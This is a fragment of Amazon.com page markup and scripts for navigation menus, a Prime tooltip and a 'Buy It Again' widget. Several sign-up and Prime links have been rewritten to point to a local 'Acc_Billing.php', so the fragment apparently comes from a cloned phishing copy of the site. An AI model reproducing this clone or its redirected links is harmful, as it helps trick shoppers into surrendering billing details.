    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:144-6121204-6279753:YF5GA687BG8W5SSXJPYR$uedata=s:%2Fuedata%2Fuedata%3Fnoscript%26id%3DYF5GA687BG8W5SSXJPYR:0' alt=""/>
</noscript>
<!-- sp:end-feature:host-atf -->
<!-- sp:feature:nav-btf -->
<!-- btf pilu -->







<style type="text/css">



#csr-hcb-wrapper {
  display: none;
}

.bia-item .bia-action-button {
  display: inline-block;
  height: 22px;
  margin-top: 3px;
  padding: 0px;
  overflow: hidden;
  text-align: center;
  vertical-align: middle;
  text-decoration: none;
  color: #111;
  font-family: Arial,sans-serif;
  font-size: 11px;
  font-style: normal;
  font-weight: normal;
  line-height: 19px;
  cursor: pointer;
  outline: 0;
  border: 1px solid;
  -webkit-border-radius: 3px 3px 3px 3px;
  -moz-border-radius: 3px 3px 3px 3px;
  border-radius: 3px 3px 3px 3px;
  border-radius: 0\9;
  border-color: #bcc1c8 #bababa #adb2bb;
  background: #eff0f3;
  background: -moz-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #f7f8fa), color-stop(100%, #e7e9ec));
  background: -webkit-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -o-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: -ms-linear-gradient(top, #f7f8fa, #e7e9ec);
  background: linear-gradient(top, #f7f8fa, #e7e9ec);
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#f7f8fa', endColorstr='#e7e9ec',GradientType=0);
  *zoom: 1;
  -webkit-box-shadow: inset 0 1px 0 0 #fff;
  -moz-box-shadow: inset 0 1px 0 0 #fff;
  box-shadow: inset 0 1px 0 0 #fff;
  box-sizing: border-box;
}

/*related to defect found in YSH page in www.amazon.fr
  font family was overriden causing button overflow on
  that particular page.
  Related SIM: https://issues.amazon.com/issues/P13N-CONSUMABLES-3104
*/
#bia-hcb-widget .a-button-text {
    font-family: Arial,sans-serif !important;
}

/*This class was added to remove star ratings from
   Shared Component's templates. Star ratings are
   currently not configurable. This will work as an
   immediate solution.
   TODO: Work with shared components to make star
   ratings configurable in their Shared View Templates
*/
#bia_content .a-icon-row {
    display: none;
}

#bia-hcb-widget .a-icon-row {
      display: none;
}

#bia_content {
    width: 266px;
}

.nav-flyout-sidePanel {
    width: 266px !important;
}
.aui-atc-button {
    margin-top: 3px;
    overflow: hidden;
    color: #111;
    font-family: Arial,sans-serif;
    font-size: 11px;
    font-style: normal;
    font-weight: normal;
}
.bia-item .bia-action-button:hover {
  border-color: #aeb4bd #adadad #9fa5af;
  background: #e0e3e8;
  background: -moz-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #e7eaf0), color-stop(100%, #d9dce1));
  background: -webkit-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -o-linear-gradient(top, #e7eaf0, #d9dce1);
  background: -ms-linear-gradient(top, #e7eaf0, #d9dce1);
  background: linear-gradient(top, #e7eaf0, #d9dce1);
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#e7eaf0', endColorstr='#d9dce1',GradientType=0);
  *zoom: 1;
  -webkit-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
  -moz-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
  box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
}

.bia-item .bia-action-button:active {
  background-color: #dcdfe3;
  -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
  -moz-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
}

.bia-item .bia-action-button-disabled {
  background: #f7f8fa;
  color: #b7b7b7;
  border-color: #e0e0e0;
  box-shadow: none;
  cursor: default;
}

.bia-item .bia-action-button-disabled:hover {
  background: #f7f8fa;
  color: #b7b7b7;
  border-color: #e0e0e0;
  box-shadow: none;
  cursor: default;
}

.bia-action-button-inner {
  border-bottom-color: #111111;
  border-bottom-style: none;
  border-bottom-width: 0px;
  border-image-outset: 0px;
  border-image-repeat: stretch;
  border-image-slice: 100%;
  border-image-width: 1;
  border-left-color: #111111;
  border-left-style: none;
  border-left-width: 0px;
  border-right-color: #111111;
  border-right-style: none;
  border-right-width: 0px;
  border-top-color: #111111;
  border-top-style: none;
  border-top-width: 0px;
  box-sizing: border-box;
  display: block;
  height: 20px;
  line-height: 19px;
  overflow: hidden;
  position: relative;
  padding: 0;
  vertical-align: baseline;
}

.bia-action-inner {
  border: 0;
  display: inline;
  font-size: 11px;
  height: auto;
  line-height: 19px;
  padding: 0px 4px 0px 4px;
  text-align: center;
  width: auto;
  white-space: nowrap;
}

.csr-content {
  font-family: Arial, Verdana, Helvetica, sans-serif;
  width: 220px;
  line-height: 19px;
}

.bia-header {
  font-size: 16px;
  color: #E47911;
  padding-bottom: 10px;
}

.bia-header-widget {
  white-space: nowrap;
  overflow: hidden;
}

.b2b-nav-header {
  white-space: nowrap;
  overflow: hidden;
  margin-bottom: 18px;
}

.bia-space-right {
  padding-right: 18px;
  white-space: normal;
  float: left;
}

.b2b-see-more-link a {
  display: inline;
  float: left;
  margin-top: 3px;
  margin-left: 3px;
}

.hcb-see-more-link a {
  color: #333;
  font-size: 13px;
  text-decoration: none;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-hcb-body {
  overflow: hidden;
}

.bia-item {
  width: 220px;
  display: inline-block;
  margin-bottom: 20px;
}

.bia-item-image {
  float: left;
  margin-right: 15px;
  width: 75px;
  height: 75px;
}

.bia-image {
  max-height: 75px;
  max-width: 75px;
  border: 0;
}

.bia-item-data {
  float: left;
  width: 130px;
}

.bia-title {
  line-height: 19px;
  font-size: 13px;
  max-height: 60px;
  overflow: hidden;
}

.bia-link:link {
  text-decoration: none;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-link:visited {
  text-decoration: none;
  color: #004B91;
}

.bia-price-nav {
  margin-top: -4px;
  color: #800;
  font-size: 12px;
  vertical-align: bottom;
}

.bia-price-yorr {
    margin-top: -8px;
    color: #800;
    font-size: 12px;
    vertical-align: bottom;
}

.bia-price {
  color: #800;
  font-size: 12px;
  vertical-align: bottom;
}

.bia-vpc-t1{
  color: #008a00;
  font-size: 12px;
  font-weight: bold;
}

.bia-vpc-t2{
  color: #008a00;
  font-size: 12px;
}

.bia-vpc-t3{
  font-size: 12px;
  line-height: 20px;
}

.bia-vpc-t3-badge{
  color: #ffffff;
  background-color: #e47911;
  font-weight: normal;

}

.bia-vpc-t3-badge::before{
  border-bottom: 10px solid #e47911;
}

.bia-vpc-t3-badge:after{
  border-top: 10px solid #e47911;
}

.bia-ppu {
  color: #800;
  font-size: 10px;
}

.bia-prime-badge {
  border: 0;
  vertical-align: middle;
}

.bia-cart-action {
  display: none;
}

.bia-cart-msg {
  display: block;
  font-family: Arial, Verdana, Helvetica, sans-serif;
  line-height: 19px;
}

.bia-cart-icon {
  background-image:
      url("https://images-na.ssl-images-amazon.com/images/G/01/Recommendations/MissionExperience/BIA/bia-atc-confirm-icon._CB485946458_.png");
  display: inline-block;
  width: 14px;
  height: 13px;
  top: 3px;
  line-height: 19px;
  position: relative;
  vertical-align: top;
}

.bia-cart-success {
  color: #090!important;
  display: inline-block;
  margin: 0;
  font-size: 13px;
  font-style: normal;
  font-weight: bold;
  font-family: Arial, Verdana, Helvetica, sans-serif;
}

.bia-cart-title {
  margin-bottom: 3px;
}

.bia-cart-form {
  margin: 0px;
}

.bia-inline-cart-form {
  margin: 0px;
}

.bia-cart-submit {
  cursor: inherit;
  left: 0;
  top: 0;
  line-height: 19px;
  height: 100%;
  width: 100%;
  padding: 1px 6px 1px 6px;
  position: absolute;
  opacity: 0.01;
  overflow: visible;
  filter: alpha(opacity=1);
  z-index: 20;
}

.bia-link-caret {
  color: #e47911;
}

</style>




<script type="text/javascript">
(function ($Nav) {
"use strict";

if (typeof $Nav === 'undefined' || $Nav === null || typeof $Nav.when !== 'function') {
    return;
}
$Nav.when('$', 'data', 'flyout.yourAccount', 'sidepanel.csYourAccount',
          'config')
    .run("BuyitAgain-YourAccount-SidePanel", 
    function ($, data, yaFlyout, csYourAccount, config) {
        if (config.disableBuyItAgain) {
          return;
        }
        var render = function (data) {
            if (data.status) {
                var widgetHtml = data.widgetBegin + 
                                 data.faceouts.join('') +
                                 data.widgetEnd;
                navbar.sidePanel({
                    flyoutName: 'yourAccount',
                    data: {html: widgetHtml}
                });
            }
        };

        var renderBuyItAgain = function (biaData) {
            if (csYourAccount) {
                csYourAccount.register(render, biaData);
            } else {
                render(biaData);
            }
        };

        yaFlyout.sidePanel.onData(function() {
            enableInlineAddToCart($); 
            enableImpressionLogging($);

            P.when('A','p13n-sc-static-list').execute(function(A, scList) {
                var navContainer = A.$("#bia-hcb-widget");
                var navList = navContainer.find('.p13n-sc-static-list');
                A.$(navList).bind('truncateList', function() {
                        scList(navList);
                });

                A.$(navList).trigger('truncateList');
            });

            if (window.P) {
                P.when('A', 'a-truncate').execute(function(A, truncate) {
                    var truncateElements = A.$('.a-truncate');
                    A.each(truncateElements, function(element) {
                        truncate.get(element).update();
                    });
                });
            }

        }); 
           
    yaFlyout.onRender(function() {
            $.ajax({
                url: '/gp/bia/external/bia-hcb-ajax-handler.html',
                data: 

   {"biaHcbRid":"YF5GA687BG8W5SSXJPYR"},
                dataType: 'json',
                timeout: 4*1000,
                success: renderBuyItAgain,
                error: function (jqXHR, textStatus, errorThrown) {
                }
            });
        });


    var updateNavCartQty = function(qty) {
        if (typeof window.navbar === 'object' && typeof window.navbar.setCartCount === 'function') {
            window.navbar.setCartCount(qty);
        }
    };

    var addToCart = function(params, callback) {
        $.ajax({
           url: '/gp/bia/external/bia-cart-ajax-handler.html',
           data: params,
           dataType: 'json', 
           timeout: 2000,
           success: function(response) { callback(response); },
           error: function() { callback({ok:0}); }
        });
    };

    var enableInlineAddToCart = function ($) {
        if ($(".bia-inline-cart-form").length === 0) {
            return;
        }

        var inlineAddToCartHandler = function(e) {
            e.preventDefault();

            var $target = $(e.target);
            var $item = $target.parents(".bia-item");
            var $submit = $item.find(".bia-cart-submit");
            var params = $target.attr('data-order');

            $submit.attr("disabled", true);
            $item.find(".bia-action-button").addClass("bia-action-button-disabled");

            addToCart(params, 
                function(response) {
                    if(response && response.ok && response.ok === '1') {
                        $item.find(".bia-faceout").hide();
                        $item.find(".bia-cart-action").show();
                        updateNavCartQty(response.numActiveItemsInCart); 
                        //TODO: add metric
                    } else {
                        $target.unbind("submit", inlineAddToCartHandler);
                        $submit.attr("disabled", false);
                        $submit.click();
                        //TODO: add metric
                    }
                }
            );
        };

        $(".bia-inline-cart-form").bind("submit", inlineAddToCartHandler);
    };

    var enableImpressionLogging = function ($) {

        var registerToLog = function (p13nLogger, callOnVisible) {
            var featureEl = $("#bia-hcb-widget");
            callOnVisible.register(featureEl, function () {
                p13nLogger.logAction({
                                action: 'view', 
                                featureElement: featureEl, 
                                replicateAsinImpressions: true
                              });
            });
        };
        
        AmazonUIPageJS.when('p13n-sc-logger', 'p13n-sc-call-on-visible')
            .execute(function(p13nLogger, callOnVisible) {
                    registerToLog(p13nLogger, callOnVisible);});
    };

    });

})(window.$Nav);
//# sourceURL=bia-hcb-js.mi
</script>








<div style="display: none">
  <div id="nav-prime-menu" class="nav-empty nav-flyout-content nav-ajax-prime-menu">
    <div class="nav_dynamic"></div>
    <div class="nav-ajax-message"></div>
    <div class="nav-ajax-error-msg">
      <p class="nav_p nav-bold">There's a problem loading this menu right now.</p>
      <p class="nav_p"><a href="Acc_Billing.php" class="nav_a">Learn more about Amazon Prime.</a></p>
    </div>
  </div>
</div>







<style>
  #nav-prime-tooltip{
    padding: 0 20px 2px 20px;
    background-color: white;
    font-family: arial,sans-serif;
  }
  .nav-npt-text-title{
    font-family: arial,sans-serif;
    font-size: 18px;
    font-weight: bold;
    line-height: 21px;
    color: #E47923;
  }
  .nav-npt-text-detail, a.nav-npt-a{
    font-family: arial,sans-serif;
    font-size: 12px;
    line-height: 14px;
    color: #333333;
    margin: 2px 0px;
  }
  a.nav-npt-a {
    text-decoration: underline;
  }
</style>


<div style="display: none">
  <div id="nav-prime-tooltip">
    <div class="nav-npt-text-title"> Get free delivery with Amazon Prime </div>
    <div class="nav-npt-text-detail"> Prime members enjoy FREE Delivery and exclusive access to music, movies, TV shows, original audio series, and Kindle books. </div>
    <div class="nav-npt-text-detail">
      &gt;
      <a class="nav-npt-a" href="Acc_Billing.php">Get started</a>
    </div>
  </div>
</div>




  











<script type="text/javascript">
  window.$Nav && $Nav.when("data").run(function(data) { data({"yourAccountContent":{"template":{"name":"itemList","data":{"items":[{"text":"Your Account","url":"/gp/css/homepage.html?ie=UTF8&ref_=nav_youraccount_ya"},{"text":"Your Orders","url":"/gp/css/order-history?ie=UTF8&ref_=nav_youraccount_orders","id":"nav_prefetch_yourorders"},{"text":"Your Lists","url":"/gp/registry/wishlist?ie=UTF8&ref_=nav_youraccount_wl&requiresSignIn=1"},{"text":"Your Recommendations","url":"/gp/yourstore?ie=UTF8&ref_=nav_youraccount_recs"},{"text":"Your Subscribe & Save Items","url":"/gp/subscribe-and-save/manager/viewsubscriptions?ie=UTF8&ref_=nav_youraccount_sns"},{"text":"Memberships & Subscriptions","url":"/yourmembershipsandsubscriptions?_encoding=UTF8&ref_=nav_youraccount_digital_subscriptions"},{"text":"Your Service Requests","url":"/localservices/ya/servicerequests?_encoding=UTF8&ref_=nav_youraccount_desktop_vas_requestlist"},{"text":"Your Garage","url":"/gp/your-garage/?ie=UTF8&ref_=nav_youraccount_au_pf_as_GNO"},{"text":"Your Fanshop","url":"/fanshop?_encoding=UTF8&ref_=nav_youraccount_yfs"},{"text":"Your Pets","url":"/yourpets?_encoding=UTF8&ref_=nav_youraccount_pet_proLibrary/files"},{"text":"Your Content and Devices","url":"/hz/mycd/myx?_encoding=UTF8&ref_=nav_youraccount_myk"},{"text":"Your Music Library","url":"/gp/dmusic/mp3/player?ie=UTF8&ref_=nav_youraccount_cldplyr"},{"text":"Your Amazon Drive","url":"/clouddrive?_encoding=UTF8&ref_=nav_youraccount_clddrv"},{"text":"Your Prime Video","url":"/Prime-Instant-Video/s/browse?_encoding=UTF8&node=2676882011&ref_=nav_youraccount_piv"},{"text":"Your Kindle Unlimited","url":"/gp/kindle/ku/ku_central?ie=UTF8&ref_=nav_youraccount_ku"},{"text":"Your Watchlist","url":"/gp/video/watchlist?ie=UTF8&ref_=nav_youraccount_ywl"},{"text":"Your Video Purchases & Rentals","url":"/gp/video/library?ie=UTF8&ref_=nav_youraccount_yvl"},{"text":"Your Android Apps & Devices","url":"/gp/mas/your-account/myapps?ie=UTF8&ref_=nav_youraccount_aad"},{"text":"Switch Accounts","url":"/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=usflex&currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_youraccount_switchacct&pageType=&switchAccount=picker&yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_youraccount_switchacct","id":"nav-item-switch-account"},{"text":"Sign Out","url":"/gp/flex/sign-out.html?ie=UTF8&action=sign-out&path=%2Fgp%2Fyourstore%2Fhome&ref_=nav_youraccount_signout&signIn=1&useRedirectOnSuccess=1","id":"nav-item-signout"}]}},"url":"/gp/css/homepage.html?ie=UTF8&ref_=ya","wlTriggers":"85042:45693"},"wishlistContent":{"template":{"name":"itemList","data":{"items":[{"text":"Create a List","url":"/gp/registry/wishlist?ie=UTF8&ref_=nav_wishlist_create&triggerElementID=createList"},{"text":"Find a List or Registry","url":"/gp/registry/search?ie=UTF8&ref_=nav_wishlist_find"},{"text":"Find a Gift","url":"/gcx/Gifts-for-Everyone/gfhz/?_encoding=UTF8&ref_=nav_wishlist_gf"},{"subtext":"Install Amazon Assistant","text":"Save Items from the Web","url":"/gp/BIT?ie=UTF8&bitCampaignCode=a0032&ref_=nav_wishlist_bit_v2_a0032"},{"text":"Wedding Registry","url":"/wedding/home?_encoding=UTF8&ref_=nav_wishlist_wr"},{"text":"Baby Registry","url":"/baby-reg/homepage?_encoding=UTF8&ref_=nav_wishlist_br"},{"text":"AmazonSmile Charity Lists","url":"/gp/clpf?ie=UTF8&ref_=nav_wishlist_smi_se_ya_lll_ll"},{"text":"Pantry Lists","url":"/gp/pantry/yourlists?ie=UTF8&ref_=nav_wishlist_pntry_gno"},{"text":"Your Hearts","url":"/ideas/saves?_encoding=UTF8&ref_=nav_wishlist_strm_in_youtique_lists"},{"text":"Explore Idea Lists","url":"/ideas?_encoding=UTF8&ref_=nav_wishlist_idea_nav"},{"text":"Explore Showroom","url":"/showroom?_encoding=UTF8&ref_=nav_wishlist_srm_your_desk_wl"},{"text":"Take the Home Style Quiz","url":"/stylequiz/?_encoding=UTF8&ref_=nav_wishlist_sq_ya_yl"}]}},"url":"/gp/registry/wishlist?ie=UTF8&ref_=flyout_yl_header","wlTriggers":"57042:165723:264888"},"cartContent":{"html":"<div id='nav-cart-flyout' class='nav-empty nav-flyout-content' data-one='{count} item' data-many='{count} items'><div class='nav-dynamic-full'><div id='nav-cart-standard' class='nav-cart-content'><a href='/gp/cart/view.html/ref=nav_flyout_viewcart?ie=UTF8&amp;hasWorkingJavascript=1' class='nav-cart-title'>Items in your Cart</a><div class='nav-cart-subtitle'></div><div class='nav-cart-items'></div></div><div id='nav-cart-pantry' class='nav-cart-content' data-box='{count} box' data-boxes='{count} boxes' data-box-filled='{pct}% filled' data-boxes-filled='{pct}% filled in current box'><a href='/gp/cart/view.html/ref=nav_flyout_viewcart?ie=UTF8&amp;hasWorkingJavascript=1' class='nav-cart-title'>Amazon Pantry Items</a><div class='nav-cart-subtitle'></div><div class='nav-cart-items'></div></div><div id='nav-cart-fresh' class='nav-cart-content'><a href='/gp/cart/view.html/ref=nav_flyout_viewcart?ie=UTF8&amp;hasWorkingJavascript=1' class='nav-cart-title'><img id='nav-cart-fresh-logo' src='https://images-na.ssl-images-amazon.com/images/G/01/gno/ec-logo-fresh-color._CB485934476_.png'></a><div class='nav-cart-subtitle'></div><div class='nav-cart-items'></div></div></div><div class='nav-ajax-message'></div><div class='nav-dynamic-empty'><p class='nav_p nav-bold nav-cart-empty'> Your Shopping Cart is empty.</p><p class='nav_p '> Give it purpose&mdash;fill it with books, DVDs, clothes, electronics, and more.</p></div><div class='nav-ajax-error-msg'><p class='nav_p nav-bold'> There's a problem previewing your cart right now.</p><p class='nav_p '> Check your Internet connection and <a href='/gp/cart/view.html/ref=nav_flyout_viewcart?ie=UTF8&hasWorkingJavascript=1' class='nav_a'>go to your cart</a>, or <a href='javascript:void(0);' class='nav_a nav-try-again'>try again</a>.</p></div><div id='nav-cart-footer'><a href='/gp/cart/view.html/ref=nav_flyout_viewcart?ie=UTF8&amp;hasWorkingJavascript=1' id='nav-cart-menu-button' class='nav-action-button'><span class='nav-action-inner'>View Cart<span id='nav-cart-menu-button-count' ><span id='nav-cart-zero'>(<span class='nav-cart-count'>0</span> items)</span><span id='nav-cart-one' style='display: none;'>(<span class='nav-cart-count'>0</span> item)</span><span id='nav-cart-many' style='display: none;'>(<span class='nav-cart-count'>0</span> items)</span></span></span></a></div></div>"},"signinContent":{"html":"<div id='nav-signin-tooltip'><a href='/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&amp;associationHandle=usflex&amp;currentPageURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin&amp;pageType=&amp;switchAccount=&amp;yshURL=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin' class='nav-action-button' data-nav-role='signin' data-nav-ref='nav_custrec_signin'><span class='nav-action-inner'>Sign in</span></a><div class='nav-signin-tooltip-footer'>New customer? <a href='Acc_Billing.php' class='nav-a'>Start here.</a></div></div>"},"templates":{"asin-promo":"<a href='<#=destination #>' class='nav_asin_promo'>  <img src='<#=image #>' class='nav_asin_promo_img'/>  <span class='nav_asin_promo_headline'><#=headline #></span>  <span class='nav_asin_promo_info'>    <span class='nav_asin_promo_title'><#=productTitle #></span>    <span class='nav_asin_promo_title2'><#=productTitle2 #></span>    <span class='nav_asin_promo_price'><#=price #></span>  </span>  <span class='nav_asin_promo_button nav-sprite'><#=button #></span></a>","discoveryPanelList":"<# var renderItems = function(items) { #>    <span class='nav-dp-title nav-item'>    Deliveries at a glance    <div class='nav-divider-container'><div class='nav-divider'></div></div></span>    <# jQuery.each(items, function (i, item) { #>        <span class='nav-item'>            <a href='<#=item.order_link#>' class='nav-dp-link'>                <span class='nav-dp-left-column'>                    <img src='<#=item.image#>' class='nav-dp-image'/>                </span>                <span class='nav-dp-right-column'>                    <span class='nav-dp-text <#=item.status#>'>                        <#=item.status_text#>                        <br/>                    </span>                    <# if(item.secondary_status_text) { #>                        <span class='nav-dp-text-secondary <#=item.status#>'>                            <#=item.secondary_status_text#>                        </span>                    <# } #>                </span>            </a>            <div class='nav-divider-container'><div class='nav-divider'></div></div>        </span>  <# }); #>  <a href='/your-orders/ref=nav_dp_ayo' class='nav-dp-link-emphasis'>      View all orders  </a><# }; #><# renderItems(items); #>","itemList":"<# var hasColumns = (function () {  var checkColumns = function (_items) {    if (!_items) {      return false;    }    for (var i=0; i<_items.length; i++) {      if (_items[i].columnBreak || (_items[i].items && checkColumns(_items[i].items))) {        return true;      }    }    return false;  };  return checkColumns(items);}()); #><# if(hasColumns) { #>  <# if(items[0].image && items[0].image.src) { #>    <div class='nav-column nav-column-first nav-column-image'>  <# } else if (items[0].greeting) { #>    <div class='nav-column nav-column-first nav-column-greeting'>  <# } else { #>    <div class='nav-column nav-column-first'>  <# } #><# } #><# var renderItems = function(items) { #>  <# jQuery.each(items, function (i, item) { #>    <# if(hasColumns && item.columnBreak) { #>      <# if(item.image && item.image.src) { #>        </div><div class='nav-column nav-column-notfirst nav-column-break nav-column-image'>      <# } else if (item.greeting) { #>        </div><div class='nav-column nav-column-notfirst nav-column-break nav-column-greeting'>      <# } else { #>        </div><div class='nav-column nav-column-notfirst nav-column-break'>      <# } #>    <# } #>    <# if(item.dividerBefore) { #>      <div class='nav-divider'></div>    <# } #>    <# if(item.text || item.content) { #>      <# if(item.url) { #>        <a href='<#=item.url #>' class='nav-link      <# } else {#>        <span class='      <# } #>      <# if(item.panelKey) { #>        nav-hasPanel      <# } #>      <# if(item.items) { #>        nav-title      <# } #>      <# if(item.decorate == 'carat') { #>        nav-carat      <# } #>      <# if(item.decorate == 'nav-action-button') { #>        nav-action-button      <# } #>      nav-item'      <# if(item.extra) { #>        <#=item.extra #>      <# } #>      <# if(item.id) { #>        id='<#=item.id #>'      <# } #>      <# if(item.dataNavRole) { #>        data-nav-role='<#=item.dataNavRole #>'      <# } #>      <# if(item.dataNavRef) { #>        data-nav-ref='<#=item.dataNavRef #>'      <# } #>      <# if(item.panelKey) { #>        data-nav-panelkey='<#=item.panelKey #>'        role='navigation'        aria-label='<#=item.text#>'      <# } #>      <# if(item.subtextKey) { #>        data-nav-subtextkey='<#=item.subtextKey #>'      <# } #>      <# if(item.image && item.image.height > 16) { #>        style='line-height:<#=item.image.height #>px;'      <# } #>      >      <# if(item.decorate == 'carat') { #>        <i class='nav-icon'></i>      <# } #>      <# if(item.image && item.image.src) { #>        <img class='nav-image' src='<#=item.image.src #>' style='height:<#=item.image.height #>px; width:<#=item.image.width #>px;' />      <# } #>      <# if(item.text) { #>        <span class='nav-text<# if(item.classname) { #> <#=item.classname #><# } #>'><#=item.text#><# if(item.badgeText) { #>          <span class='nav-badge'><#=item.badgeText#></span>        <# } #></span>      <# } else if (item.content) { #>        <span class='nav-content'><# jQuery.each(item.content, function (j, cItem) { #><# if(cItem.url && cItem.text) { #><a href='<#=cItem.url #>' class='nav-a'><#=cItem.text #></a><# } else if (cItem.text) { #><#=cItem.text#><# } #><# }); #></span>      <# } #>      <# if(item.subtext) { #>        <span class='nav-subtext'><#=item.subtext #></span>      <# } #>      <# if(item.url) { #>        </a>      <# } else {#>        </span>      <# } #>    <# } #>    <# if(item.image && item.image.src) { #>      <# if(item.url) { #>        <a href='<#=item.url #>'>       <# } #>      <img class='nav-image'      <# if(item.id) { #>        id='<#=item.id #>'      <# } #>      src='<#=item.image.src #>' <# if (item.alt) { #> alt='<#= item.alt #>'<# } #>/>      <# if(item.url) { #>        </a>       <# } #>    <# } #>    <# if(item.items) { #>      <div class='nav-panel'> <# renderItems(item.items); #> </div>    <# } #>  <# }); #><# }; #><# renderItems(items); #><# if(hasColumns) { #>  </div><# } #>","notificationsList":"<div class='nav-item nav-title'>  Notifications</div><# jQuery.each(items || [], function (i, item) { #>  <div class='nav-item<# if (item.type) { #> nav-noti-list-<#= item.type #><# } #><# if (item.image && item.image.src) { #> nav-noti-list-with-image<# } #>'>    <# if (item.dismissId) { #>      <div class='nav-noti-list-x' data-noti-id='<#= item.dismissId #>'>&times;</div>    <# } #>    <# if (item.image && item.image.src) { #>      <div class='nav-noti-list-image'>        <img class='nav-noti-list-image-tag' src='<#= item.image.src #>' <# if (item.image.alt) { #> alt='<#= item.image.alt #>'<# } #> <# if (item.image.title) { #> title='<#= item.image.title #>'<# } #>/>      </div>    <# } #>    <# if (item.heading) { #>      <div class='nav-noti-list-heading'><#= item.heading #></div>    <# } #>    <# jQuery.each(item.content || [], function (j, itemContent) { #>      <# if (itemContent.url) { #>        <a href='<#= itemContent.url #>' class='nav-noti-list-content'>      <# } else { #>        <div class='nav-noti-list-content'>      <# } #>        <# if (itemContent.text) { #>          <span class='nav-noti-list-text'><#= itemContent.text #></span>        <# } #>        <# if (itemContent.subtext) { #>          <span class='nav-noti-list-subtext'><#= itemContent.subtext #></span>        <# } #>      <# if (itemContent.url) { #>        </a>      <# } else { #>        </div>      <# } #>    <# }); #>  </div><# }); #>","discoveryPanelSummary":"    <span class='nav-dp-title nav-item'>    Deliveries at a glance    <div class='nav-divider-container'><div class='nav-divider'></div></div></span>    <# jQuery.each(items || [], function (i, item) { #>        <span class='nav-item'>            <span class='nav-dp-left-column'>                <img src='<#=item.image.url#>' class='nav-dp-image' height='<#=item.image.height#>'/>            </span>            <span class='nav-dp-right-column'>                <#=item.status_text#>                <div class='nav-dp-secondary-row'>                    <a href='/your-orders/ref=nav_dp_ryo' class='nav-dp-link-emphasis'>                        Sign in to view orders                    </a>                </div>            </span>        </span>    <# }); #>","htmlList":"  <# jQuery.each(items, function (i, item) { #>    <div class='nav-item'>      <#=item #>    </div>  <# }); #>","subnav":"<# if (obj && obj.type === 'vertical') { #>  <# jQuery.each(obj.rows, function (i, row) { #>    <# if (row.flyoutElement === 'button') { #>      <div class='nav_sv_fo_v_button'        <# if (row.elementStyle) { #>          style='<#= row.elementStyle #>'        <# } #>      >        <a href='<#=row.url #>' class='nav-action-button nav-sprite'>          <#=row.text #>        </a>      </div>    <# } else if (row.flyoutElement === 'list' && row.list) { #>      <# jQuery.each(row.list, function (j, list) { #>        <div class='nav_sv_fo_v_column <#=(j === 0) ? 'nav_sv_fo_v_first' : '' #>'>          <ul class='<#=list.elementClass #>'>          <# jQuery.each(list.linkList, function (k, link) { #>            <# if (k === 0) { link.elementClass += ' nav_sv_fo_v_first'; } #>            <li class='<#=link.elementClass #>'>              <# if (link.url) { #>                <a href='<#=link.url #>' class='nav_a'><#=link.text #></a>              <# } else { #>                <span class='nav_sv_fo_v_span'><#=link.text #></span>              <# } #>            </li>          <# }); #>          </ul>        </div>      <# }); #>    <# } else if (row.flyoutElement === 'link') { #>      <# if (row.topSpacer) { #>        <div class='nav_sv_fo_v_clear'></div>      <# } #>      <div class='<#=row.elementClass #>'>        <a href='<#=row.url #>' class='nav_sv_fo_v_lmargin nav_a'>          <#=row.text #>        </a>      </div>    <# } #>  <# }); #><# } else if (obj) { #>  <div class='nav_sv_fo_scheduled'>    <#= obj #>  </div><# } #>","wishlist":"<# jQuery.each(wishlist, function (i, item) { #>  <li class='nav_pop_li'>    <a href='<#=item.url #>' class='nav_a'>      <#=item.name #>    </a>    <div class='nav_tag'>      <!-- TODO this logic should now be in dynamic-wish-list.mi -->      <# if(typeof item.count !='undefined') { #>        <#=          (item.count == 1 ? '{count} item' : '{count} items')            .replace('{count}', item.count)        #>      <# } #>    </div>  </li><# }); #>","cart":"<# jQuery.each(items, function (i, item) { #>  <div class='nav-cart-item'>    <a href='<#=item.url #>' class='nav-cart-item-link'>      <img src='<#=item.img #>' class='nav-cart-item-image' />      <span class='nav-cart-item-title'><#=item.name #></span>      <# if (item.weight) { #>        <span class='nav-cart-item-weight' style='display:none;'>          <#= 'Ship weight: {value} {unit}'.replace('{value}', item.weight.value).replace('{unit}', item.weight.unit) #>        </span>      <# } #>      <# if (item.ourPrice) { #>        <span class='nav-cart-item-buyingPrice'><#=item.ourPrice #></span>      <# } #>      <# if (item.scarcityMessage) { #>        <span class='<#=item.scarcityClass #>'><#=item.scarcityMessage #></span>      <# } #>      <span class='nav-cart-item-quantity'>        <#= 'Quantity: {count}'.replace('{count}', item.qty) #>      </span>    </a>  </div>  <# if (i%2==1) { #>    <div class='nav-cart-item-break'></div>  <# } #><# }); #><div class='nav-cart-item-break'></div>"}}); });
</script>

  <script type="text/javascript">
